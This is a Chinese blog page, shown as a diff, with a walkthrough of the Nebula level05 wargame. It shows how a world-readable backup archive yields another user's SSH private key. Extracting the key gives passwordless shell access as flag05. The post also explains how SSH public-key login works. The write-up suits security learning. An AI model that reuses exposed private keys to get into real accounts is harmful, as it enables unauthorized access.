@@ -1,0 +1,279 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <meta name="Keywords" content="blog"/>
+    <meta name="Description" content="blog"/>
+    <title>Mr.Hot</title>
+    <link rel="shortcut icon" href="/static/favicon.png"/>
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+</head>
+<body>
+<div class="main">
+    <div class="header">
+    	<ul id="pages">
+            <li><a href="/">home</a></li>
+            <li><a href="/#/tags">tags</a></li>
+            <li><a href="/#/archive">archive</a></li>
+    	</ul>
+    </div>
+	<div class="wrap-header">
+	<h1>
+    <a href="/" id="title"></a>
+	</h1>
+	</div>
+<div id="md" style="display: none;">
+<!-- markdown -->
+##Level05关卡介绍：
+这一关提示说明是要找到*弱文件夹权限*，让我们重点关注下文件夹吧。
+
+使用level05的账号登陆系统（密码也是level05）。
+
+相关文件可以在/home/flag05中找到。
+
+[关卡原址](https://exploit-exercises.com/nebula/level05/)
+
+
+##先看看flag05下的所有文件夹吧
+![Alt text](http://i76.photobucket.com/albums/j22/Jo_Yunix/level05_1_zpst1lmeazv.png)
+
+~~~~{bash}
+ls -l | grep ^d #grep过滤出所有文件夹
+~~~~
+
+
+有个隐藏文件夹的名字叫.backup，这简直就是在说，快来看看我里面有什么吧：P
+
+并且我们拥有对其的访问权限。
+
+##看看.backup下有些什么吧
+![Alt text](http://i76.photobucket.com/albums/j22/Jo_Yunix/level05_2_zps1u3sy3nx.png)
+
+~~~~{bash}
+#t --list 很奇怪为什么是t？
+#f --file
+#v --verbose
+tar -tvf backup-19072011.tgz 
+~~~~
+
+##重大发现！！！
+![Alt text](http://i76.photobucket.com/albums/j22/Jo_Yunix/level05_03_zpspv3llukh.png)
+
+文件备份的居然是.ssh文件夹，里面还包含了公钥和私钥！！
+
+
+##赶紧悄悄地拿到home目录去覆盖自己的.ssh文件夹
+![Alt text](http://i76.photobucket.com/albums/j22/Jo_Yunix/level05_04_zpsekzadeyt.png)
+
+~~~~{bash}
+#x --extract
+#z --gzip, --gunzip, --ungzip      filter the archive through gzip
+tar -xzvf backup-19072011.tgz 
+~~~~
+
+
+##然后使用ssh连接本机
+~~~~{bash}
+ssh flag05@localhost
+~~~~
+
+无需登录密码，直接获得flag05的Shell。
+
+##庖丁解牛
+>为什么将flag05的.ssh备份文件覆盖到自己的.ssh文件夹中就可以直接连接了呢？
+###ssh的公钥登录过程：
+
+1. 本地机器将自己的公钥存到远程服务器的home目录中的.ssh文件夹中（具体附加在`authorized_keys`中）。
+2.  登录的时候，远程主机会向用户发送一段随机字符串。
+3. 用户用自己的私钥加密后，再发回远程主机。
+4. 远程主机用事先储存的公钥进行解密，如果成功，就证明用户是可信的，直接允许登录shell。
+
+###那么只要在authorized_keys文件中存在flag05的公钥即可。
+
+查看公钥是否在authorized_keys中存在：
+~~~~{bash}
+#在解压完后的.ssh文件夹下执行
+python -c "print open('id_rsa.pub').read() in open('authorized_keys').read()"
+~~~~
+
+执行完脚本后发现备份的`authorized_keys`中确实存在flag05的公钥，这说明了当前flag05的home目录下的authorized_keys文件中有`极大可能`还存在其公钥。
+
+###参考：
+* [SSH原理与运用（一）：远程登录](http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html)
+* [RSA算法原理（一）](http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html)
+<!-- markdown end -->
+</div>
+<div class="entry" id="main">
+<!-- content -->
+<h2 id="level05">Level05关卡介绍：</h2>
+
+<p>这一关提示说明是要找到<em>弱文件夹权限</em>，让我们重点关注下文件夹吧。</p>
+
+<p>使用level05的账号登陆系统（密码也是level05）。</p>
+
+<p>相关文件可以在/home/flag05中找到。</p>
+
+<p><a href="https://exploit-exercises.com/nebula/level05/">关卡原址</a></p>
+
+<h2 id="flag05">先看看flag05下的所有文件夹吧</h2>
+
+<p><img src="http://i76.photobucket.com/albums/j22/Jo_Yunix/level05_1_zpst1lmeazv.png" alt="Alt text" title=""></p>
+
+<pre class=" language-bash"><code class=" language-bash">ls <span class="token operator">-</span>l <span class="token operator">|</span> grep <span class="token operator">^</span>d <span class="token comment" spellcheck="true">#grep过滤出所有文件夹
+</span></code></pre>
+
+<p>有个隐藏文件夹的名字叫.backup，这简直就是在说，快来看看我里面有什么吧：P</p>
+
+<p>并且我们拥有对其的访问权限。</p>
+
+<h2 id="backup">看看.backup下有些什么吧</h2>
+
+<p><img src="http://i76.photobucket.com/albums/j22/Jo_Yunix/level05_2_zps1u3sy3nx.png" alt="Alt text" title=""></p>
+
+<pre class=" language-bash"><code class=" language-bash"><span class="token comment" spellcheck="true">#t --list 很奇怪为什么是t？
+</span><span class="token comment" spellcheck="true">#f --file
+</span><span class="token comment" spellcheck="true">#v --verbose
+</span>tar <span class="token operator">-</span>tvf backup<span class="token number">-19072011</span><span class="token punctuation">.</span>tgz 
+</code></pre>
+
+<h2 id="">重大发现！！！</h2>
+
+<p><img src="http://i76.photobucket.com/albums/j22/Jo_Yunix/level05_03_zpspv3llukh.png" alt="Alt text" title=""></p>
+
+<p>文件备份的居然是.ssh文件夹，里面还包含了公钥和私钥！！</p>
+
+<h2 id="homessh">赶紧悄悄地拿到home目录去覆盖自己的.ssh文件夹</h2>
+
+<p><img src="http://i76.photobucket.com/albums/j22/Jo_Yunix/level05_04_zpsekzadeyt.png" alt="Alt text" title=""></p>
+
+<pre class=" language-bash"><code class=" language-bash"><span class="token comment" spellcheck="true">#x --extract
+</span><span class="token comment" spellcheck="true">#z --gzip, --gunzip, --ungzip      filter the archive through gzip
+</span>tar <span class="token operator">-</span>xzvf backup<span class="token number">-19072011</span><span class="token punctuation">.</span>tgz 
+</code></pre>
+
+<h2 id="ssh">然后使用ssh连接本机</h2>
+
+<pre class=" language-bash"><code class=" language-bash">ssh flag05@localhost
+</code></pre>
+
+<p>无需登录密码，直接获得flag05的Shell。</p>
+
+<h2 id="">庖丁解牛</h2>
+
+<blockquote>
+  <p>为什么将flag05的.ssh备份文件覆盖到自己的.ssh文件夹中就可以直接连接了呢？</p>
+</blockquote>
+
+<h3 id="ssh">ssh的公钥登录过程：</h3>
+
+<ol>
+<li>本地机器将自己的公钥存到远程服务器的home目录中的.ssh文件夹中（具体附加在<code>authorized_keys</code>中）。</li>
+<li>登录的时候，远程主机会向用户发送一段随机字符串。</li>
+<li>用户用自己的私钥加密后，再发回远程主机。</li>
+<li>远程主机用事先储存的公钥进行解密，如果成功，就证明用户是可信的，直接允许登录shell。</li>
+</ol>
+
+<h3 id="authorized_keysflag05">那么只要在authorized_keys文件中存在flag05的公钥即可。</h3>
+
+<p>查看公钥是否在authorized_keys中存在：</p>
+
+<pre class=" language-bash"><code class=" language-bash"><span class="token comment" spellcheck="true">#在解压完后的.ssh文件夹下执行
+</span>python <span class="token operator">-</span>c <span class="token string">"print open('id_rsa.pub').read() in open('authorized_keys').read()"</span>
+</code></pre>
+
+<p>执行完脚本后发现备份的<code>authorized_keys</code>中确实存在flag05的公钥，这说明了当前flag05的home目录下的authorized_keys文件中有<code>极大可能</code>还存在其公钥。</p>
+
+<h3 id="">参考：</h3>
+
+<ul>
+<li><a href="http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html">SSH原理与运用（一）：远程登录</a></li>
+<li><a href="http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html">RSA算法原理（一）</a></li>
+</ul>
+<!-- content end -->
+</div>
+<br>
+<br>
+    <div id="disqus_thread"></div>
+	<div class="footer">
+		<p>↖(▔＾▔)↗</p>
+	</div>
+<!-- duoshuo -->
+<div class="ds-thread" data-thread-key="dOZWJ1bGLbGV2ZWwwNQ==" data-title="单刷Nebula之level05" data-url=hot.github.io"dOZWJ1bGLbGV2ZWwwNQ==.html"></div>
+<!-- duoshuo end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+<script type="text/javascript">
+var duoshuoQuery = {short_name:"hotgithub"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+<!-- 多说公共JS代码 end -->
+</div>
+<script src="../main.js"></script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$'], ["\\(", "\\)"]], processEscapes: true}});
+</script>
+<script id="content" type="text/mustache">
+    <h1>{{title}}</h1>
+    <div class="tag">
+    {{date}}
+    {{#tags}}
+    <a href="/#/tag/{{name}}">#{{name}}</a>
+    {{/tags}}
+    </div>
+</script>
+<script id="pagesTemplate" type="text/mustache">
+    {{#pages}}
+    <li>
+        <a href="{{path}}">{{title}}</a>
+    </li>
+    {{/pages}}
+</script>
+<script>
+$(document).ready(function() {
+    $.ajax({
+        url: "../main.json",
+        type: "GET",
+        dataType: "json",
+        success: function(data) {
+            $("#title").html(data.name);
+            var pagesTemplate = Hogan.compile($("#pagesTemplate").html());
+            var pagesHtml = pagesTemplate.render({"pages": data.pages});
+            $("#pages").append(pagesHtml);
+            //path
+            var path = "dOZWJ1bGLbGV2ZWwwNQ==.html";
+            //path end
+            var now = 0;
+            for (var i = 0; i < data.posts.length; ++i)
+                if (path == data.posts[i].path)
+                    now = i;
+            var post = data.posts[now];
+            var tmp = post.tags.split(" ");
+            var tags = [];
+            for (var i = 0; i < tmp.length; ++i)
+                if (tmp[i].length > 0)
+                    tags.push({"name": tmp[i]});
+            var contentTemplate = Hogan.compile($("#content").html());
+            var contentHtml = contentTemplate.render({"title": post.title, "tags": tags, "date": post.date});
+            $("#main").prepend(contentHtml);
+            if (data.disqus_shortname.length > 0) {
+                var disqus_shortname = data.disqus_shortname;
+                (function() {
+                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                })();
+            }
+        }
+    });
+});
+</script>
+</body>
+</html>
